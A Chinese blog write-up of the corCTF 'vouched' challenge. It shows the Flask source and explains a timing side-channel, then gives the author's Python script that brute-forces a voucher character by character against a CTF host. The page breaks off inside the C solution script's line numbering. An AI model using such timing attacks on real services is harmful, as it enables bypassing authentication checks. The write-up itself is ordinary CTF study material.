@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言这个比赛为什么我要单开复现一题，实属心有不甘 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#!&#x2F;usr&#x2F;bin&#x2F;env python3from flask import Flask,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="corCTF-vouched">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/corCTF-vouched/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="前言这个比赛为什么我要单开复现一题，实属心有不甘 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#!&#x2F;usr&#x2F;bin&#x2F;env python3from flask import Flask,">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-09-07T09:08:47.000Z">
+<meta property="article:modified_time" content="2025-09-07T09:09:02.619Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="题解">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>corCTF-vouched</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/%E6%B9%BE%E5%8C%BA%E6%9D%AFweb%E5%85%A8%E8%A7%A3/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-CC6%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/corCTF-vouched/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&text=corCTF-vouched"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&title=corCTF-vouched"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&is_video=false&description=corCTF-vouched"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=corCTF-vouched&body=Check out this article: https://hexo.sheep-sys-sudo.top/corCTF-vouched/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&title=corCTF-vouched"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&title=corCTF-vouched"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&title=corCTF-vouched"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&title=corCTF-vouched"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&name=corCTF-vouched&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/corCTF-vouched/&t=corCTF-vouched"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">3.</span> <span class="toc-text">后记</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        corCTF-vouched
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-09-07T09:08:47.000Z" class="dt-published" itemprop="datePublished">2025-09-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/%E5%A4%8D%E7%8E%B0/">复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web/" rel="tag">web</a>, <a class="p-category" href="/tags/%E9%A2%98%E8%A7%A3/" rel="tag">题解</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个比赛为什么我要单开复现一题，实属心有不甘</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">import</span> hashlib, hmac, binascii</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">&quot;FLAG&#123;EXAMPLE_FLAG&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">PBKDF2_ITERATIONS = <span class="number">1750000</span></span><br><span class="line">DKLEN = <span class="number">32</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_voucher</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">    length = <span class="number">12</span></span><br><span class="line">    dash_positions = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">    chars = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> dash_positions:</span><br><span class="line">            chars.append(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            chars.append(random.choice(<span class="string">&quot;ABCDEF0123456789&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(chars)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VOUCHER_CODE = generate_voucher()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] Voucher code: <span class="subst">&#123;VOUCHER_CODE&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_signature</span>(<span class="params">password: <span class="built_in">str</span>, salt: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(</span><br><span class="line">        hashlib.pbkdf2_hmac(<span class="string">&quot;sha256&quot;</span>, password.encode(), salt.encode(), PBKDF2_ITERATIONS, dklen=DKLEN)</span><br><span class="line">    ).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/check&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    j = request.get_json(force=<span class="literal">True</span>)</span><br><span class="line">    voucher = j.get(<span class="string">&quot;voucher&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    signature = j.get(<span class="string">&quot;signature&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(voucher) != <span class="built_in">len</span>(VOUCHER_CODE):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Code incorrect&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(voucher):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> VOUCHER_CODE[i] != ch:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Code incorrect&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Tampering protection</span></span><br><span class="line">        ua = request.headers.get(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;sheep&quot;</span>)</span><br><span class="line">        expected = calculate_signature(voucher, ua)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> hmac.compare_digest(signature, expected):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Tampering detected&quot;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;See you at corCTF 2026, your ticket is: <span class="subst">&#123;FLAG&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8001</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>
+<p>其实这个逻辑看第一眼不懂第二眼就该懂了，出题人的这一步逻辑暗藏玄鸡</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(voucher):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> VOUCHER_CODE[i] != ch:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Code incorrect&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Tampering protection</span></span><br><span class="line">        ua = request.headers.get(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;sheep&quot;</span>)</span><br><span class="line">        expected = calculate_signature(voucher, ua)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> hmac.compare_digest(signature, expected):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Tampering detected&quot;</span></span><br></pre></td></tr></table></figure></div>
+<p>它为什么要吃力不讨好，如果真要验证的话直接比较不就完了，这个地方肯定是可以拿到voucher，但是实际上我们发现，除了第一位可以根据回显差异弄出来，其他几位逻辑上是弄不出来的<br>但是实际</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">start = time.time()</span><br><span class="line">r = requests.post(URL, json=data, headers=headers)</span><br><span class="line">elapsed = time.time() - start</span><br></pre></td></tr></table></figure></div>
+<p>是可以拿到时间消耗<br>服务器每升一位进行判定正确时，都会多进行一次<code>expected = calculate_signature(voucher, ua)</code><br>这样会导致时间消耗增加,直接打测信道<br>即，我们通过爆破看时消耗，打测信道可以完美测出voucher的每一位<br>进而拿到flag<br>但是现实很丰满，本地完美爆破，远程依托答辩<br>丢一篇失败者的脚本</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests, hashlib, binascii, time</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;https://vouched-1a8e887590d23904.ctfi.ng/check&quot;</span></span><br><span class="line">UA = <span class="string">&quot;sheep&quot;</span></span><br><span class="line">CHARSET = <span class="string">&quot;ABCDEF0123456789&quot;</span></span><br><span class="line">VOUCHER_LEN = <span class="number">12</span></span><br><span class="line">DASH_POSITIONS = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">PBKDF2_ITERATIONS = <span class="number">1750000</span></span><br><span class="line">DKLEN = <span class="number">32</span></span><br><span class="line">TIME_THRESHOLD = <span class="number">0.3</span>  <span class="comment"># 明显耗时阈值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_sig</span>(<span class="params">password: <span class="built_in">str</span>, salt: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(</span><br><span class="line">        hashlib.pbkdf2_hmac(<span class="string">&quot;sha256&quot;</span>, password.encode(), salt.encode(),</span><br><span class="line">                            PBKDF2_ITERATIONS, dklen=DKLEN)</span><br><span class="line">    ).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_voucher</span>(<span class="params">voucher: <span class="built_in">str</span></span>) -&gt; <span class="built_in">float</span>:</span><br><span class="line">    sig = calc_sig(voucher, UA)</span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: UA&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;voucher&quot;</span>: voucher, <span class="string">&quot;signature&quot;</span>: sig&#125;</span><br><span class="line">    start = time.time()</span><br><span class="line">    r = requests.post(URL, json=data, headers=headers)</span><br><span class="line">    elapsed = time.time() - start</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;See you at corCTF&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!!!] Voucher 完整找到:&quot;</span>, voucher)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> elapsed</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack</span>():</span><br><span class="line">    found = [<span class="string">&quot;?&quot;</span>] * VOUCHER_LEN</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(VOUCHER_LEN):</span><br><span class="line">        <span class="keyword">if</span> pos <span class="keyword">in</span> DASH_POSITIONS:</span><br><span class="line">            found[pos] = <span class="string">&quot;-&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 固定位置 <span class="subst">&#123;pos&#125;</span> = &#x27;-&#x27;&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[*] 爆破位置 <span class="subst">&#123;pos&#125;</span>, 当前前缀: <span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(found)&#125;</span>&quot;</span>)</span><br><span class="line">        base_time = <span class="literal">None</span></span><br><span class="line">        best_char = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(CHARSET):</span><br><span class="line">            guess = found.copy()</span><br><span class="line">            guess[pos] = ch</span><br><span class="line">            <span class="comment"># 其他未知字符填充A保证长度</span></span><br><span class="line">            guess_str = <span class="string">&quot;&quot;</span>.join([c <span class="keyword">if</span> c != <span class="string">&quot;?&quot;</span> <span class="keyword">else</span> <span class="string">&quot;A&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> guess])</span><br><span class="line"></span><br><span class="line">            elapsed = try_voucher(guess_str)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    <span class="subst">&#123;ch&#125;</span> -&gt; <span class="subst">&#123;elapsed:<span class="number">.4</span>f&#125;</span>s&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                <span class="comment"># 第一字符作为基准值</span></span><br><span class="line">                base_time = elapsed</span><br><span class="line">                best_char = ch</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> base_time - elapsed &gt; TIME_THRESHOLD:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;    &gt;&gt; 命中峰值字符 <span class="subst">&#123;ch&#125;</span> , time=<span class="subst">&#123;elapsed:<span class="number">.4</span>f&#125;</span>s&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> elapsed - base_time &gt; TIME_THRESHOLD:</span><br><span class="line">                <span class="comment"># 明显峰值，直接认定</span></span><br><span class="line">                best_char = ch</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    &gt;&gt; 命中峰值字符 <span class="subst">&#123;ch&#125;</span>, time=<span class="subst">&#123;elapsed:<span class="number">.4</span>f&#125;</span>s&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        found[pos] = best_char</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 位置 <span class="subst">&#123;pos&#125;</span> 确定: <span class="subst">&#123;best_char&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[***] Voucher 爆破完成:&quot;</span>, <span class="string">&quot;&quot;</span>.join(found))</span><br><span class="line">    <span class="comment"># 最后请求flag</span></span><br><span class="line">    final_voucher = <span class="string">&quot;&quot;</span>.join(found)</span><br><span class="line">    sig = calc_sig(final_voucher, UA)</span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: UA&#125;</span><br><span class="line">    r = requests.post(URL, json=&#123;<span class="string">&quot;voucher&quot;</span>: final_voucher, <span class="string">&quot;signature&quot;</span>: sig&#125;, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[FINAL RESPONSE]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    crack()</span><br></pre></td></tr></table></figure></div>
+<p>这里要喷下靶机运行时间，为啥只有十分钟，消耗精度兑换时间了()</p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>老外就是不一样，用C写脚本获得更精准的时间消耗</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">定时测量使用 gettimeofday() 函数执行,该函数提供微秒精度。漏洞利用测量从发送 HTTP 请求之前到收到响应之前的时间,捕获包括网络延迟和服务器处理时间在内的总时间</span><br></pre></td></tr></table></figure></div>
+<p>总脚本</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span 